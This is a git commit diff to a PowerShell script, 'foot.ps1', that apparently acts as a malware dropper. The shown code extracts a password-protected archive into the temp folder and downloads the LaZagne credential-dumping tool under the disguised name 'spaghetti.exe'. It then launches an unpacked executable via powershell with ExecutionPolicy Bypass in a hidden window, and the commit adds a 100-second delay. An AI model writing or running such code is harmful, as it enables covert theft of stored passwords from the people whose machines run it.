d3d3619e602427a354f0d7f953fa724fc7566b53
bakgatviooldoos <56836858+bakgatviooldoos@users.noreply.github.com>
2023-07-25 11:16:40 +0200

    Update foot.ps1

--- foot.ps1
+++ foot.ps1
@@ -12,9 +12,11 @@ $extractedFolderPath = "$env:TEMP\HOME"
 $arguments = "x", "`"$zipFilePath`"", "-o`"$extractedFolderPath`"", "-p$Password"
 Start-Process -FilePath "C:\Program Files\7-Zip\7z.exe" -ArgumentList $arguments -Wait
 
+Start-Sleep -Seconds 100
+
 Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$extractedFolderPath\spaghetti.exe"
 
-$executablePath = Join-Path $extractedFolderPath "self.exe"
+$executablePath = "$env:TEMP\HOME\self.exe"
 
 # Execute the unpacked file
 Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$executablePath`"" -WindowStyle Hidden
